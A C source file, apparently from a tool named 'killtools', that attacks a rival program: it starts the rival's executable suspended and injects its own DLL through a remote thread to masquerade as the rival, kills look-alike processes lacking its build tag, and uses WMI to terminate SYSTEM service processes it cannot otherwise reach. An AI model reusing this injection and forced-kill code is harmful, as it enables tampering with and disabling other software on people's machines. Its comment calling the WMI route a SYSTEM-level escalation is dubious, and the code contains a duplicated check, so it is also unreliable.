/* killtools/parts/hollow_wmi.c —— 被 killtools.c 直接 include
   内容：宿主化（hollow）/ 反宿主化自证 / WMI 兜底杀。
   拆出来只是让 killtools.c 别写到 3000 行；符号仍是同一个翻译单元。 */

/* ================== 宿主化（hollow）：把对手映像变成我方宿主 ==================
   思路：CreateProcess(CREATE_SUSPENDED) 一个**对手自己的 exe**（比如 yy.exe），
   主线程永远不 Resume（对手代码一行都不会执行），然后往这个进程里注入我方 atkcore。
   结果：任务管理器里它就是 yy.exe，yyguard 数进程/看心跳都会把它当"自己人"，
   而我方代码已经在里面跑 —— 相当于我们白拿了一个不会反抗的 yy 宿主。
   PID 记进白名单表，所有击杀路径都跳过它们（防止自己杀自己）。 */
#define HOLLOW_MAX 8
static DWORD g_hollowPid[HOLLOW_MAX];

static BOOL IsHollowPid(DWORD pid)
{
    int i;
    for (i = 0; i < HOLLOW_MAX; i++) if (g_hollowPid[i] == pid) return TRUE;
    return FALSE;
}

static void AddHollowPid(DWORD pid)
{
    int i;
    if (!pid || IsHollowPid(pid)) return;
    for (i = 0; i < HOLLOW_MAX; i++) {
        if (g_hollowPid[i] == 0) { g_hollowPid[i] = pid; return; }
    }
    /* 表满：挤掉最旧的一格（顺序写，够用） */
    for (i = 0; i < HOLLOW_MAX - 1; i++) g_hollowPid[i] = g_hollowPid[i + 1];
    g_hollowPid[HOLLOW_MAX - 1] = pid;
}

/* 把 atkcore 自己注入到 pid（LoadLibraryW 远程线程），返回是否成功 */
static BOOL InjectSelfInto(DWORD pid)
{
    WCHAR self[MAX_PATH];
    SIZE_T size;
    LPVOID mem;
    HANDLE hProc, hThread;
    DWORD code = 0;
    BOOL ok = FALSE;

    if (!GetModuleFileNameW(g_hSelfModule, self, MAX_PATH)) return FALSE;
    size = (wcslen(self) + 1) * sizeof(WCHAR);

    hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                        PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProc) return FALSE;

    mem = VirtualAllocEx(hProc, NULL, size, MEM_COMMIT, PAGE_READWRITE);
    if (mem && WriteProcessMemory(hProc, mem, self, size, NULL)) {
        LPTHREAD_START_ROUTINE pLoad = (LPTHREAD_START_ROUTINE)
            GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
        hThread = CreateRemoteThread(hProc, NULL, 0, pLoad, mem, 0, NULL);
        if (hThread) {
            WaitForSingleObject(hThread, 5000);
            if (GetExitCodeThread(hThread, &code) && code != 0) ok = TRUE;
            CloseHandle(hThread);
        }
    }
    if (mem) VirtualFreeEx(hProc, mem, 0, MEM_RELEASE);
    CloseHandle(hProc);
    return ok;
}

/* 用对手的映像做宿主：成功返回新 PID（已登记为白名单），失败 0 */
static DWORD HollowFromImage(LPCWSTR imagePath)
{
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    WCHAR dir[MAX_PATH];
    WCHAR *slash;

    if (!imagePath || !imagePath[0]) return 0;
    if (GetFileAttributesW(imagePath) == INVALID_FILE_ATTRIBUTES) return 0;

    wcsncpy_s(dir, MAX_PATH, imagePath, _TRUNCATE);
    slash = wcsrchr(dir, L'\\');
    if (!slash) return 0;
    *(slash + 1) = L'\0';

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (!CreateProcessW(imagePath, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW | DETACHED_PROCESS,
                        NULL, dir, &si, &pi)) {
        WriteKillLog(L"宿主化: CreateProcess 失败 %ls err=%lu", imagePath, GetLastError());
        return 0;
    }

    /* 主线程保持挂起：对手的 DllMain/主逻辑一行都不执行 */
    if (!InjectSelfInto(pi.dwProcessId)) {
        WriteKillLog(L"宿主化: 注入自身失败 PID=%lu，改为直接结束", pi.dwProcessId);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 0;
    }

    AddHollowPid(pi.dwProcessId);
    WriteKillLog(L"宿主化成功: %ls -> PID=%lu（主线程挂起，我方代码在跑；已加入免杀白名单）",
                 imagePath, pi.dwProcessId);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return pi.dwProcessId;
}

/* 从活着的对手进程里挑一个映像路径来宿主化（路径不确定，靠进程自报） */
static DWORD HollowFirstEnemy(void)
{
    HANDLE hSnap;
    PROCESSENTRY32W pe;
    DWORD pid = 0;

    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;
    memset(&pe, 0, sizeof(pe));
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(hSnap, &pe)) {
        do {
            WCHAR img[MAX_PATH] = L"";
            DWORD cch = MAX_PATH;
            HANDLE hProc;
            if (!IsTargetName(pe.szExeFile)) continue;
            if (IsHollowPid(pe.th32ProcessID)) continue;
            hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
            if (!hProc) continue;
            if (QueryFullProcessImageNameW(hProc, 0, img, &cch) && img[0]) {
                CloseHandle(hProc);
                pid = HollowFromImage(img);
                if (pid) break;
                continue;
            }
            CloseHandle(hProc);
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return pid;
}

/* ================== 反宿主化：识别"假的自家人" ==================
   对手也能看到我们的代码（仓库是公开的），所以必须提前防：
     · 任何自称 xx.exe 的进程，如果它的映像里**没有**我们的构建标记导出
       （XxBuildTag），那它不是我们 —— 是被宿主化/挖空的假货，直接结束。
     · 检查只用 PE 头 + 导出表名表，**不扫内存**（几十字节，微秒级），
       避免"为了抓一个假货把 CPU 烧掉"。
     · 另外校验自己：本进程映像头与磁盘文件头不一致 → 我们被改了 → 记日志报警。 */
static BOOL HasOurBuildTag(DWORD pid)
{
    HANDLE hProc;
    BYTE hdr[0x400];
    SIZE_T got = 0;
    ULONG_PTR base = 0;
    BOOL found = FALSE;

    hProc = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProc) return TRUE;                   /* 读不到就当正常，别乱杀 */

    /* 拿映像基址：PEB->ImageBaseAddress（x64: PEB+0x10） */
    {
        ULONG_PTR peb = 0;
        struct { ULONG_PTR Reserved1, PebBaseAddress, Reserved2[2], UniqueProcessId, Reserved3; } pbi;
        typedef LONG (NTAPI *pfnNtQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
        HMODULE hNt = GetModuleHandleW(L"ntdll.dll");
        pfnNtQIP pQip = hNt ? (pfnNtQIP)GetProcAddress(hNt, "NtQueryInformationProcess") : NULL;
        if (pQip && pQip(hProc, 0 /*ProcessBasicInformation*/, &pbi, sizeof(pbi), NULL) == 0)
            peb = pbi.PebBaseAddress;
        if (!peb) { CloseHandle(hProc); return TRUE; }
        if (!ReadProcessMemory(hProc, (LPCVOID)(peb + 0x10), &base, sizeof(base), &got) || !base) {
            CloseHandle(hProc);
            return TRUE;
        }
    }

    if (ReadProcessMemory(hProc, (LPCVOID)base, hdr, sizeof(hdr), &got) && got == sizeof(hdr)) {
        IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)hdr;
        if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
            DWORD ntOff = (DWORD)dos->e_lfanew;
            if (ntOff + sizeof(IMAGE_NT_HEADERS) <= sizeof(hdr)) {
                IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(hdr + ntOff);
                if (nt->Signature == IMAGE_NT_SIGNATURE) {
                    DWORD expRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
                    if (expRva) {
                        BYTE exp[0x400];
                        if (ReadProcessMemory(hProc, (LPCVOID)(base + expRva), exp, sizeof(exp), &got)) {
                            IMAGE_EXPORT_DIRECTORY *ed = (IMAGE_EXPORT_DIRECTORY *)exp;
                            DWORD nameRva = ed->AddressOfNames;
                            if (nameRva < 0x10000) {
                                DWORD names[64];
                                SIZE_T n = sizeof(names) > 64 * 4 ? 64 * 4 : sizeof(names);
                                if (ed->NumberOfNames < 64) n = (SIZE_T)ed->NumberOfNames * 4;
                                if (ReadProcessMemory(hProc, (LPCVOID)(base + nameRva), names, n, &got)) {
                                    DWORD cnt = (DWORD)(got / 4), i;
                                    for (i = 0; i < cnt; i++) {
                                        char nm[64];
                                        if (names[i] > 0x10000) continue;
                                        if (!ReadProcessMemory(hProc, (LPCVOID)(base + names[i]), nm, sizeof(nm), &got))
                                            continue;
                                        nm[sizeof(nm) - 1] = '\0';
                                        if (strcmp(nm, "XxBuildTag") == 0) { found = TRUE; break; }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    CloseHandle(hProc);
    return found;
}

/* 扫一遍"自称 xx 但不是我方"的进程（便宜：只看 PE 头 + 导出名表） */
static void CheckFakeSelf(void)
{
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe;
    if (hSnap == INVALID_HANDLE_VALUE) return;
    memset(&pe, 0, sizeof(pe));
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"xx.exe") != 0) continue;
            if (pe.th32ProcessID == GetCurrentProcessId()) continue;
        if (IsHollowPid(pe.th32ProcessID)) continue;   /* 我方宿主化进程：不许杀 */
            if (IsHollowPid(pe.th32ProcessID)) continue;
            if (HasOurBuildTag(pe.th32ProcessID)) continue;
            WriteKillLog(L"[反宿主化] PID=%lu 自称 xx.exe 但没有我方构建标记 -> 判为假货",
                         pe.th32ProcessID);
            {
                HANDLE hK = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (hK) {
                    TerminateProcess(hK, 0);
                    CloseHandle(hK);
                    WriteKillLog(L"[反宿主化] 已结束假 xx.exe PID=%lu", pe.th32ProcessID);
                }
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
}
/* ================== WMI 兜底杀：Win32_Process.Terminate ==================
   日志实证：yy 有一部分进程（它自己放的 yysvc.exe，注册成服务跑在 SYSTEM）
   对我们的 TerminateProcess 一律 err=5 —— 普通管理员令牌打不开 SYSTEM 进程。
   WMI 的提供程序（WmiPrvSE）以 SYSTEM 身份执行，`Win32_Process.Terminate`
   就能结束我们令牌够不着的目标。这是用户态里最"干净"的提权路径：
   不写驱动、不改注册表、不留持久化。 */
static BOOL WmiTerminateProcess(DWORD pid)
{
    IWbemLocator *pLoc = NULL;
    IWbemServices *pSvc = NULL;
    IWbemClassObject *pCls = NULL, *pIn = NULL, *pOut = NULL;
    HRESULT hr, hrExec = E_FAIL;
    WCHAR objPath[128];
    BSTR bPath = NULL, bMethod = NULL;
    BOOL ok = FALSE;
    BOOL bComInit = FALSE;

    if (pid <= 4) return FALSE;

    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (SUCCEEDED(hr)) bComInit = TRUE;
    else if (hr != RPC_E_CHANGED_MODE) return FALSE;

    hr = CoCreateInstance(&CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
                          &IID_IWbemLocator, (void **)&pLoc);
    if (FAILED(hr) || !pLoc) goto done;

    hr = pLoc->lpVtbl->ConnectServer(pLoc, L"ROOT\\CIMV2", NULL, NULL, NULL, 0,
                                     NULL, NULL, &pSvc);
    if (FAILED(hr) || !pSvc) goto done;

    /* 让调用以本进程身份走（WmiPrvSE 侧再以 SYSTEM 执行 Terminate） */
    CoSetProxyBlanket((IUnknown *)pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                      RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL,
                      EOAC_NONE);

    _snwprintf(objPath, _countof(objPath) - 1, L"Win32_Process.Handle=\"%lu\"", pid);
    objPath[_countof(objPath) - 1] = L'\0';

    bPath = SysAllocString(objPath);
    if (!bPath) goto done;

    hr = pSvc->lpVtbl->GetObject(pSvc, bPath, 0, NULL, &pCls, NULL);
    if (FAILED(hr) || !pCls) goto done;

    bMethod = SysAllocString(L"Terminate");
    if (!bMethod) goto done;

    hr = pCls->lpVtbl->GetMethod(pCls, bMethod, 0, &pIn, NULL);
    if (FAILED(hr)) goto done;

    /* Terminate 的入参只有一个可选 Reason，传 NULL 入参对象即可（默认 0） */
    hrExec = pSvc->lpVtbl->ExecMethod(pSvc, bPath, bMethod, 0, NULL, pIn, &pOut, NULL);
    if (SUCCEEDED(hrExec) && pOut) {
        VARIANT vRet;
        VariantInit(&vRet);
        if (SUCCEEDED(pOut->lpVtbl->Get(pOut, L"ReturnValue", 0, &vRet, NULL, NULL)) &&
            vRet.vt == VT_I4) {
            ok = (vRet.lVal == 0);      /* 0 = 成功；2 = 拒绝访问；9 = 路径不存在 */
            if (!ok)
                WriteKillLog(L"WMI Terminate PID=%lu 返回 %ld（2=拒绝访问 9=进程不存在）",
                             pid, vRet.lVal);
            else
                WriteKillLog(L"WMI Terminate PID=%lu 成功（SYSTEM 身份兜底）", pid);
        }
        VariantClear(&vRet);
    }

done:
    if (bMethod) SysFreeString(bMethod);
    if (bPath) SysFreeString(bPath);
    if (pIn) pIn->lpVtbl->Release(pIn);
    if (pOut) pOut->lpVtbl->Release(pOut);
    if (pCls) pCls->lpVtbl->Release(pCls);
    if (pSvc) pSvc->lpVtbl->Release(pSvc);
    if (pLoc) pLoc->lpVtbl->Release(pLoc);
    if (bComInit) CoUninitialize();
    return ok;
}

/* 杀不掉（err=5）时用它兜底；成功后等 300ms 确认退出 */
static BOOL KillViaWmi(DWORD pid)
{
    HANDLE h;
    if (!WmiTerminateProcess(pid)) return FALSE;
    h = OpenProcess(SYNCHRONIZE | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!h) return TRUE;                     /* 打不开基本就是已经没了 */
    if (WaitForSingleObject(h, 300) == WAIT_OBJECT_0) {
        WriteKillLog(L"WMI 兜底确认退出 PID=%lu", pid);
        CloseHandle(h);
        return TRUE;
    }
    CloseHandle(h);
    WriteKillLog(L"WMI 兜底已下发但进程仍在 PID=%lu", pid);
    return FALSE;
}
